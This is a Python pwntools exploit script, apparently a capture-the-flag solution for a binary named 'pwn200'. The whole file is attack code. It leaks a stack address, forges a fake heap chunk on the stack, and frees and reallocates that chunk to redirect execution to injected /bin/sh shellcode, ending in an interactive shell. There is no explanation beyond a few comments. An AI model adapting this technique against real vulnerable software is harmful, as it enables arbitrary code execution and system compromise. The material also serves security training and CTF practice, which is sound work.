#!/usr/bin/env python
#-*- coding: utf-8 -*-
from pwn import *

def exploit():
    shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')
    payload = shellcode.ljust(0x30, 'A')

    io.recvuntil('who are u?\n')
    io.send(payload)
    io.recvuntil(payload)

    rbp_addr = u64(io.recvn(6).ljust(8, '\x00')) - 0x20
    log.info('rbp_addr: ' + hex(rbp_addr))
    shellcode_addr = rbp_addr - 0x30
    log.info('shellcode_addr: ' + hex(shellcode_addr))
    fake_chunk_addr = shellcode_addr - 0x40
    log.info('fake_chunk_addr: ' + hex(fake_chunk_addr))

    io.recvuntil('give me your id ~~?\n')
    io.sendline(str(0x20))
    payload = p64(0) * 4 + p64(0) + p64(0x40)
    # padding + pre_size + size
    payload = payload.ljust(0x38, '\x00') + p64(fake_chunk_addr)
    # gdb.attach(io)
    io.recvuntil('give me money~\n')
    io.send(payload)

    io.recvuntil('your choice : ')
    io.sendline(str(2))
    # free the fake chunk
    io.recvuntil('your choice : ')
    io.sendline(str(1))
    io.recvuntil('how long?\n')
    io.sendline(str(0x30))
    # malloc the fake chunk

    io.recvuntil('48\n')
    payload = 'A' * 0x18 + p64(shellcode_addr)
    payload = payload.ljust(0x30, '\x00')
    io.send(payload)

    io.recvuntil('your choice : ')
    io.sendline(str(3))
    io.interactive()

if __name__ == '__main__':
    io = process('./pwn200')

    exploit()
